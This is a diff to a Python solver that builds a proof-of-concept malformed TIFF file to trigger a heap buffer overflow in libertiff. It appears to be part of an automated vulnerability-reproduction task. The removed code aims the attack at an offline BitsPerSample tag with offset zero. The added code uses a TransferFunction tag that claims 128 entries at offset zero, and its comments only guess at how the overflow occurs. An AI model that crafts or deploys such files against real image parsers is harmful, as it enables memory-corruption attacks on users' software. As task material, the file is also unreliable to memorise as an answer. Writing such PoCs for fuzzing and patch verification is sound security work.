@@ -2,65 +2,58 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability in libertiff.
-        The vulnerability is a Heap Buffer Overflow caused by an invalid offline tag 
-        with a value offset of zero.
-        """
-        # Build the TIFF file components
-        poc = bytearray()
+        # Construct a TIFF file (Little Endian)
+        # Header: "II" (0x4949), Version 42 (0x002A), Offset to first IFD 8
+        poc = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
         
-        # 1. Header (8 bytes)
-        # Byte Order: Little Endian ("II" = 0x4949)
-        # Magic: 42 (0x002A)
-        # Offset to 0th IFD: 8 (0x00000008)
-        poc.extend(b'II\x2a\x00\x08\x00\x00\x00')
+        # Directory Entries
+        entries = []
         
-        # 2. Image File Directory (IFD)
-        # Located at offset 8.
-        # We need to construct an IFD with a tag that triggers the vulnerability.
-        # Vulnerability condition: Offline tag (size > 4 bytes) with Value Offset = 0.
+        # Tag 256 (ImageWidth): SHORT, Count 1, Value 16
+        entries.append(struct.pack('<HHII', 256, 3, 1, 16))
         
-        # Tags to include (must be sorted by Tag ID):
-        # 256 (0x100) ImageWidth
-        # 257 (0x101) ImageLength
-        # 258 (0x102) BitsPerSample - TRIGGER CANDIDATE
-        #             Type: SHORT (3), Count: 3 (for RGB). Total size: 3*2 = 6 bytes (> 4).
-        #             Offset: 0. 
-        #             This causes the parser to read the file header as the BitsPerSample values.
-        # 259 (0x103) Compression
-        # 262 (0x106) PhotometricInterpretation
-        # 273 (0x111) StripOffsets
-        # 277 (0x115) SamplesPerPixel
-        # 278 (0x116) RowsPerStrip
-        # 279 (0x117) StripByteCounts
+        # Tag 257 (ImageLength): SHORT, Count 1, Value 16
+        entries.append(struct.pack('<HHII', 257, 3, 1, 16))
         
-        tags = [
-            (256, 4, 1, 16),      # ImageWidth: 16
-            (257, 4, 1, 16),      # ImageLength: 16
-            (258, 3, 3, 0),       # BitsPerSample: Count 3 (Size 6), Offset 0 -> TRIGGER
-            (259, 3, 1, 1),       # Compression: 1 (None)
-            (262, 3, 1, 2),       # PhotometricInterpretation: 2 (RGB)
-            (273, 4, 1, 122),     # StripOffsets: Points to data at end of IFD (8 + 2 + 9*12 + 4 = 122)
-            (277, 3, 1, 3),       # SamplesPerPixel: 3
-            (278, 4, 1, 16),      # RowsPerStrip: 16
-            (279, 4, 1, 1),       # StripByteCounts: 1 byte of data
-        ]
+        # Tag 258 (BitsPerSample): SHORT, Count 1, Value 1
+        # This implies a TransferFunction table size of 1<<1 = 2 entries
+        entries.append(struct.pack('<HHII', 258, 3, 1, 1))
         
-        # Number of directory entries (2 bytes)
-        poc.extend(struct.pack('<H', len(tags)))
+        # Tag 259 (Compression): SHORT, Count 1, Value 1 (None)
+        entries.append(struct.pack('<HHII', 259, 3, 1, 1))
         
-        # Write the directory entries (12 bytes each)
-        for tag_id, type_id, count, val_or_off in tags:
-            # Struct format: Tag(2), Type(2), Count(4), Value/Offset(4)
-            poc.extend(struct.pack('<HHII', tag_id, type_id, count, val_or_off))
+        # Tag 262 (PhotometricInterpretation): SHORT, Count 1, Value 1 (BlackIsZero)
+        entries.append(struct.pack('<HHII', 262, 3, 1, 1))
+        
+        # Tag 273 (StripOffsets): LONG, Count 1, Value 8 (Points to header)
+        entries.append(struct.pack('<HHII', 273, 4, 1, 8))
+        
+        # Tag 277 (SamplesPerPixel): SHORT, Count 1, Value 1
+        entries.append(struct.pack('<HHII', 277, 3, 1, 1))
+        
+        # Tag 278 (RowsPerStrip): LONG, Count 1, Value 16
+        entries.append(struct.pack('<HHII', 278, 4, 1, 16))
+        
+        # Tag 279 (StripByteCounts): LONG, Count 1, Value 1
+        entries.append(struct.pack('<HHII', 279, 4, 1, 1))
+        
+        # Tag 301 (TransferFunction): SHORT, Count 128, Offset 0
+        # Vulnerability Trigger:
+        # - Tag is "offline" because size (128 * 2 = 256 bytes) > 4 bytes.
+        # - Offset 0 points to start of file (valid readable memory).
+        # - The library expects 2 entries (based on BPS=1) but the tag claims 128 entries.
+        # - If the library allocates based on expected size (4 bytes) but loops based on tag count (128),
+        #   it will write 256 bytes into a 4-byte buffer, causing a Heap Buffer Overflow.
+        entries.append(struct.pack('<HHII', 301, 3, 128, 0))
+        
+        # Write IFD Entry Count
+        poc += struct.pack('<H', len(entries))
+        
+        # Write Entries
+        for entry in entries:
+            poc += entry
             
-        # Offset to next IFD (4 bytes) - 0 indicates end
-        poc.extend(struct.pack('<I', 0))
-        
-        # 3. Image Data
-        # Current length matches the StripOffsets value (122 bytes)
-        # Add 1 byte of data as specified by StripByteCounts
-        poc.extend(b'\x00')
+        # Next IFD Offset (0)
+        poc += struct.pack('<I', 0)
         
         return bytes(poc)
